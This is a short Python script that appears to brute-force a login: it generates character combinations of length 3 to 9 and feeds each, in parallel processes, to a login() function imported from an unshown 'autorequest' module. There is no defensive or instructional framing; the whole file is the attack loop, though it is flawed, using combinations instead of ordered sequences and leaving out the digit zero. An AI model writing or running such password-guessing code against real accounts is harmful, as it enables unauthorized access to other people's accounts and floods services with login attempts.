import itertools
from itertools import combinations
import multiprocessing


from autorequest import login
def get_password():
    list1 = ['1', '2', '3', '4', '5', '6', '7', '8', '9',
             'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
             'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
             'A','B',"C", 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
             'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']


    pool = multiprocessing.Pool(processes=multiprocessing.cpu_count()-2)
    for i in range(3,10):
        chunk_size = 10000
        combinations = itertools.combinations(list1,i)
        for chuck in iter(lambda :list(itertools.islice(combinations,chunk_size)),[]):
            pool.map(combine,chuck)


    pool.close()
    pool.join()



def combine(c):
    pwd_str = ''.join(c)
    login(pwd_str)
    # print(pwd_str)




get_password()
